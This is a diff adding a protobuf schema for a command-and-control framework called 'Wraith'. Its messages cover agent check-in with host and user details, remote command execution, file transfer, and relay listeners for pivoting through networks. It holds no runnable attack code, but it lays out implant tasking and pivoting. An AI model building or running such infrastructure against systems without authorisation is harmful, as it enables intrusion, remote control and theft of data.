@@ -1,0 +1,241 @@
+syntax = "proto3";
+
+package wraith.tunnel;
+
+// ─── Agent → Nexus Messages ────────────────────────────────────────────────
+
+// Registration — sent by agent on first connect (before Yamux negotiation)
+message WraithRegistration {
+    string hostname        = 1;
+    string username       = 2;
+    string os             = 3;   // "linux", "windows", "macos", "bsd"
+    string os_version     = 4;
+    string arch           = 5;   // "x64", "x86", "arm", etc.
+    string domain         = 6;
+    string ip_address     = 7;
+    uint32 pid            = 8;
+    bool   tun_capable    = 9;   // agent has root (real TUN support)
+    bool   userspace_tun  = 10;  // agent using custom userspace stack
+    bool   supports_tls   = 11;
+    bool   supports_aes256 = 12;
+}
+
+// Heartbeat — periodic check-in from agent
+message WraithHeartbeat {
+    uint32 commands_executed = 1;
+    string status           = 2;
+    uint64 timestamp       = 3;
+}
+
+// CommandResult — response to a command
+message WraithCommandResult {
+    string command_id   = 1;
+    string status      = 2;  // "success" | "error" | "timeout"
+    string stdout      = 3;
+    string stderr      = 4;
+    uint32 exit_code  = 5;
+    string error       = 6;
+    uint64 duration_ms = 7;
+}
+
+// FileTransfer — upload/download data
+message WraithFileTransfer {
+    string action       = 1;  // "upload" | "download"
+    string remote_path = 2;
+    uint64 offset       = 3;
+    uint64 total_size  = 4;
+    bytes  data        = 5;
+}
+
+// ─── Nexus → Agent Command ────────────────────────────────────────────────
+
+// NexusCommand — sent by Nexus to agent via control channel
+message NexusCommand {
+    string command_id      = 1;
+    string action          = 2;  // "execute", "upload", "download", "add_relay", etc.
+    map<string, string> params = 3;
+    uint32 timeout        = 4;
+}
+
+// AddRelay — C2 tells agent to spawn a TCP listener that forwards to connect_addr via relay chain
+message AddRelay {
+    string listen_addr  = 1;  // "0.0.0.0:8080" — address to listen on
+    string connect_addr = 2;  // "target:80" — address to connect to through relay chain
+    string relay_id     = 3;  // unique ID for this relay
+}
+
+message AddRelayResponse {
+    string relay_id     = 1;
+    bool   success     = 2;
+    string error_msg   = 3;
+    string bound_addr  = 4;  // actual address bound
+}
+
+// ─── Tunnel Payloads ─────────────────────────────────────────────────────
+
+message TunnelOpen {
+    string tunnel_id       = 1;
+    string relay_tun_ip    = 2;
+    string agent_tun_ip    = 3;
+    string tunnel_netmask  = 4;
+    string routes         = 5;
+    string encryption      = 6;
+    bytes  nonce           = 7;
+}
+
+message TunnelOpenAck {
+    string tunnel_id   = 1;
+    bool   success     = 2;
+    string error_msg   = 3;
+    string assigned_ip = 4;
+}
+
+message TunnelClose {
+    string tunnel_id = 1;
+    string reason     = 2;
+}
+
+message TunnelStats {
+    string tunnel_id    = 1;
+    uint64 bytes_in     = 2;
+    uint64 bytes_out    = 3;
+    uint64 packets_in   = 4;
+    uint64 packets_out  = 5;
+}
+
+message TunnelStatsRequest {
+    string tunnel_id = 1;
+}
+
+message TunnelData {
+    string tunnel_id = 1;
+    bytes  payload   = 2;
+}
+
+message Keepalive {
+    string tunnel_id = 1;
+    uint64 timestamp = 2;
+}
+
+message KeepaliveAck {
+    string tunnel_id = 1;
+    uint64 timestamp = 2;
+}
+
+// ─── Relay Payloads ──────────────────────────────────────────────────────
+
+message RelayOpen {
+    string relay_id    = 1;
+    string mode        = 2;  // "tcp" | "udp" | "file" | "exec" | "listener" | "forward"
+    string local_addr  = 3;
+    string remote_addr = 4;
+    string file_path  = 5;
+    string command    = 6;
+    uint32 timeout    = 7;
+    bool   keepalive  = 8;
+}
+
+message RelayOpenAck {
+    string relay_id   = 1;
+    bool   success   = 2;
+    string error_msg = 3;
+    string bound_addr = 4;
+}
+
+message RelayClose {
+    string relay_id = 1;
+    string reason    = 2;
+}
+
+message RelayStats {
+    string relay_id     = 1;
+    uint64 bytes_in     = 2;
+    uint64 bytes_out    = 3;
+    uint64 connections  = 4;
+}
+
+message RelayStatsRequest {
+    string relay_id = 1;
+}
+
+message RelayList {}
+
+message RelayListResponse {
+    message RelayInfo {
+        string relay_id    = 1;
+        string mode        = 2;
+        string local_addr  = 3;
+        string remote_addr = 4;
+        string status      = 5;
+        uint64 connections = 6;
+    }
+    repeated RelayInfo relays = 1;
+}
+
+// ─── Control Messages (oneofs for channel 1) ────────────────────────────
+
+message TunnelControl {
+    oneof msg {
+        TunnelOpen open              = 1;
+        TunnelOpenAck open_ack       = 2;
+        TunnelClose close            = 3;
+        TunnelStats stats            = 4;
+        TunnelStatsRequest stats_request = 5;
+        Keepalive keepalive          = 6;
+        KeepaliveAck keepalive_ack   = 7;
+    }
+}
+
+message RelayControl {
+    oneof msg {
+        RelayOpen open               = 1;
+        RelayOpenAck open_ack        = 2;
+        RelayClose close             = 3;
+        RelayStats stats             = 4;
+        RelayStatsRequest stats_request = 5;
+        RelayList list               = 6;
+        RelayListResponse list_response = 7;
+    }
+}
+
+// ─── Top-level AgentMessage (oneof) ────────────────────────────────────
+// Wraps all message types that flow between agent and Nexus.
+// Used on channel 1 (control) for command dispatch.
+
+message AgentMessage {
+    oneof msg {
+        WraithRegistration registration    = 1;
+        WraithHeartbeat heartbeat          = 2;
+        WraithCommandResult result         = 3;
+        WraithFileTransfer file_transfer   = 4;
+        NexusCommand command              = 5;
+        TunnelControl tunnel_control      = 6;
+        RelayControl relay_control         = 7;
+        PeerMessage peer_message          = 8;
+    }
+}
+
+// ─── Peer-to-peer Handshake Messages ─────────────────────────────────────
+
+message PeerInfo {
+    string node_id = 1;
+    string version = 2;
+    bool tun_capable = 3;
+    string tun_ip = 4;
+    bool supports_relay = 5;
+    bool supports_nexus = 6;
+    map<string, string> options = 7;
+}
+
+message PeerAck {
+    string node_id = 1;
+    bool accepted = 2;
+    string error = 3;
+}
+
+message PeerMessage {
+    oneof msg {
+        PeerInfo info = 1;
+        PeerAck ack = 2;
+    }
+}
